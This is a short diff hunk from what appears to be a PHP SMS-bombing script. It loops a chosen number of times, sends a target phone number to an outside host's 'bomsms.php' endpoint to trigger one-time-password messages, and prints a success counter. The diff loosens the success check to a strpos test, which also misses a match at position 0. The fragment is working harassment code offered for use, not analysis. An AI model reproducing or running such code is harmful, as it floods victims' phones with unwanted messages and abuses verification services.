@@ -102,7 +102,7 @@ for($a=1;$a<=$jum;$a++){
 
 $gass = curl('https://izzy27.000webhostapp.com/bomsms.php?Nope='.$no);
 
-if($gass == 'Success send otp'){
+if(strpos($gass,'Success')){
 
 echo color("green","[✓] ")."Success send otp".color("green"," [$a]\n");;
 
